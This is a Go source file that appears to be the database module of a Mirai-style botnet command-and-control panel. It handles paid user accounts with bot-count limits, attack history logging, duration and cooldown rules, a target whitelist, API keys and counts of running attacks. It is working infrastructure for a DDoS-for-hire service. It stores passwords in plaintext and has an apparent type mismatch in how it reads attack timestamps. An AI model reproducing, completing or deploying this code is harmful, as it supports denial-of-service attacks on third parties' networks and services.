package main

import (
	"database/sql"
	"encoding/binary"
	"fmt"
	"net"
	"time"

	_ "github.com/go-sql-driver/mysql"
)

/* ============================================================================
 * DATABASE MODULE - MySQL/MariaDB Integration
 * ============================================================================
 * Tables: users, history, whitelist, logins, online
 * Features:
 *   - User authentication with login logging
 *   - Attack history tracking
 *   - IP whitelist protection
 *   - API key validation
 *   - Cooldown and duration limits
 * ============================================================================ */

type Database struct {
	db *sql.DB
}

type AccountInfo struct {
	username string
	maxBots  int
	admin    int
}

func NewDatabase(dbAddr string, dbUser string, dbPassword string, dbName string) *Database {
	db, err := sql.Open("mysql", fmt.Sprintf("%s:%s@tcp(%s)/%s", dbUser, dbPassword, dbAddr, dbName))
	if err != nil {
		return nil
	}
	return &Database{db}
}

func (this *Database) TryLogin(username string, password string, ip net.Addr) (bool, AccountInfo) {
	strRemoteAddr := ip.String()
	host, _, _ := net.SplitHostPort(strRemoteAddr)

	rows, err := this.db.Query("SELECT username, max_bots, admin FROM users WHERE username = ? AND password = ? AND (wrc = 0 OR (UNIX_TIMESTAMP() - last_paid < `intvl` * 24 * 60 * 60))", username, password)
	if err != nil {
		this.db.Exec("INSERT INTO logins (username, action, ip) VALUES (?, ?, ?)", username, "Fail", host)
		return false, AccountInfo{"", 0, 0}
	}
	defer rows.Close()

	if !rows.Next() {
		this.db.Exec("INSERT INTO logins (username, action, ip) VALUES (?, ?, ?)", username, "Fail", host)
		return false, AccountInfo{"", 0, 0}
	}

	var accInfo AccountInfo
	rows.Scan(&accInfo.username, &accInfo.maxBots, &accInfo.admin)

	this.db.Exec("INSERT INTO logins (username, action, ip) VALUES (?, ?, ?)", accInfo.username, "Login", host)

	return true, accInfo
}

func (this *Database) CreateBasic(username string, password string, max_bots int, duration int, cooldown int) bool {
	rows, err := this.db.Query("SELECT username FROM users WHERE username = ?", username)
	if err != nil {
		return false
	}
	defer rows.Close()
	if rows.Next() {
		return false
	}
	_, err = this.db.Exec("INSERT INTO users (username, password, max_bots, admin, last_paid, cooldown, duration_limit) VALUES (?, ?, ?, 0, UNIX_TIMESTAMP(), ?, ?)", username, password, max_bots, cooldown, duration)
	return err == nil
}

func (this *Database) CreateAdmin(username string, password string, max_bots int, duration int, cooldown int) bool {
	rows, err := this.db.Query("SELECT username FROM users WHERE username = ?", username)
	if err != nil {
		return false
	}
	defer rows.Close()
	if rows.Next() {
		return false
	}
	_, err = this.db.Exec("INSERT INTO users (username, password, max_bots, admin, last_paid, cooldown, duration_limit) VALUES (?, ?, ?, 1, UNIX_TIMESTAMP(), ?, ?)", username, password, max_bots, cooldown, duration)
	return err == nil
}

func (this *Database) RemoveUser(username string) bool {
	_, err := this.db.Exec("DELETE FROM users WHERE username = ?", username)
	return err == nil
}

func (this *Database) BlockRange(prefix string, netmask string) bool {
	rows, err := this.db.Query("SELECT prefix FROM whitelist WHERE prefix = ?", prefix)
	if err != nil {
		return false
	}
	defer rows.Close()
	if rows.Next() {
		return false
	}
	_, err = this.db.Exec("INSERT INTO whitelist (prefix, netmask) VALUES (?, ?)", prefix, netmask)
	return err == nil
}

func (this *Database) UnBlockRange(prefix string) bool {
	_, err := this.db.Exec("DELETE FROM whitelist WHERE prefix = ?", prefix)
	return err == nil
}

func (this *Database) CheckApiCode(apikey string) (bool, AccountInfo) {
	rows, err := this.db.Query("SELECT username, max_bots, admin FROM users WHERE api_key = ? AND (wrc = 0 OR (UNIX_TIMESTAMP() - last_paid < `intvl` * 24 * 60 * 60))", apikey)
	if err != nil {
		return false, AccountInfo{"", 0, 0}
	}
	defer rows.Close()
	if !rows.Next() {
		return false, AccountInfo{"", 0, 0}
	}
	var accInfo AccountInfo
	rows.Scan(&accInfo.username, &accInfo.maxBots, &accInfo.admin)
	return true, accInfo
}

func (this *Database) ContainsWhitelistedTargets(attack *Attack) bool {
	for addr, netmask := range attack.Targets {
		rows, err := this.db.Query("SELECT prefix, netmask FROM whitelist")
		if err != nil {
			return false
		}
		for rows.Next() {
			var dbPrefix string
			var dbNetmask string
			rows.Scan(&dbPrefix, &dbNetmask)
			dbPrefixInt := binary.BigEndian.Uint32(net.ParseIP(dbPrefix).To4())
			// Parse netmask as integer, not duration
			dbNetmaskInt := 32
			fmt.Sscanf(dbNetmask, "%d", &dbNetmaskInt)
			
			// Check if target overlaps with whitelisted range
			if netshift(addr, netmask) == netshift(dbPrefixInt, uint8(dbNetmaskInt)) {
				rows.Close()
				return true
			}
		}
		rows.Close()
	}
	return false
}

func (this *Database) CanLaunchAttack(username string, duration uint32, command string, maxBots int, allowConcurrent int) (bool, error) {
	var userDurationLimit int
	var userCooldown int
	var lastAttack time.Time

	row := this.db.QueryRow("SELECT duration_limit, cooldown FROM users WHERE username = ?", username)
	err := row.Scan(&userDurationLimit, &userCooldown)
	if err != nil {
		return false, err
	}

	if userDurationLimit > 0 && int(duration) > userDurationLimit {
		return false, fmt.Errorf("Attack duration exceeds your limit (%d seconds)", userDurationLimit)
	}

	if userCooldown > 0 {
		row = this.db.QueryRow("SELECT time_sent FROM history WHERE username = ? ORDER BY time_sent DESC LIMIT 1", username)
		err = row.Scan(&lastAttack)
		if err == nil {
			cooldownEnd := lastAttack.Add(time.Duration(userCooldown) * time.Second)
			if time.Now().Before(cooldownEnd) {
				return false, fmt.Errorf("Please wait %d seconds before launching another attack", userCooldown)
			}
		}
	}

	// Log attack to history
	this.db.Exec("INSERT INTO history (username, command, duration, max_bots, time_sent) VALUES (?, ?, ?, ?, UNIX_TIMESTAMP())", username, command, duration, maxBots)

	return true, nil
}

func (this *Database) totalAdmins() int {
	var count int
	row := this.db.QueryRow("SELECT COUNT(*) FROM users WHERE admin = 1")
	row.Scan(&count)
	return count
}

func (this *Database) totalUsers() int {
	var count int
	row := this.db.QueryRow("SELECT COUNT(*) FROM users WHERE admin = 0")
	row.Scan(&count)
	return count
}

func (this *Database) fetchAttacks() int {
	var count int
	row := this.db.QueryRow("SELECT COUNT(*) FROM history")
	row.Scan(&count)
	return count
}

func (this *Database) ongoingIds() int {
	var id int
	row := this.db.QueryRow("SELECT id FROM history WHERE duration + time_sent > UNIX_TIMESTAMP() ORDER BY time_sent DESC LIMIT 1")
	err := row.Scan(&id)
	if err != nil {
		return 0
	}
	return id
}

func (this *Database) ongoingCommands() string {
	var command string
	row := this.db.QueryRow("SELECT command FROM history WHERE duration + time_sent > UNIX_TIMESTAMP() ORDER BY time_sent DESC LIMIT 1")
	err := row.Scan(&command)
	if err != nil {
		return "none"
	}
	return command
}

func (this *Database) ongoingDuration() int {
	var duration int
	row := this.db.QueryRow("SELECT duration FROM history WHERE duration + time_sent > UNIX_TIMESTAMP() ORDER BY time_sent DESC LIMIT 1")
	err := row.Scan(&duration)
	if err != nil {
		return 0
	}
	return duration
}

func (this *Database) ongoingBots() int {
	var bots int
	row := this.db.QueryRow("SELECT max_bots FROM history WHERE duration + time_sent > UNIX_TIMESTAMP() ORDER BY time_sent DESC LIMIT 1")
	err := row.Scan(&bots)
	if err != nil {
		return 0
	}
	return bots
}

func (this *Database) fetchRunningAttacks() int {
	var count int
	row := this.db.QueryRow("SELECT COUNT(*) FROM history WHERE duration + time_sent > UNIX_TIMESTAMP()")
	row.Scan(&count)
	return count
}

func (this *Database) fetchUsers() int {
	var count int
	row := this.db.QueryRow("SELECT COUNT(*) FROM users")
	row.Scan(&count)
	return count
}

func (this *Database) CleanLogs() bool {
	_, err := this.db.Exec("DELETE FROM history")
	return err == nil
}

func (this *Database) Logout(username string) {
	this.db.Exec("INSERT INTO logins (username, action, ip) VALUES (?, ?, ?)", username, "Logout", "N/A")
}

// ValidateCredentials validates username and password for SSH authentication
func (this *Database) ValidateCredentials(username string, password string) bool {
	row := this.db.QueryRow("SELECT username FROM users WHERE username = ? AND password = ? AND (wrc = 0 OR (UNIX_TIMESTAMP() - last_paid < `intvl` * 24 * 60 * 60))", username, password)
	var result string
	err := row.Scan(&result)
	return err == nil
}
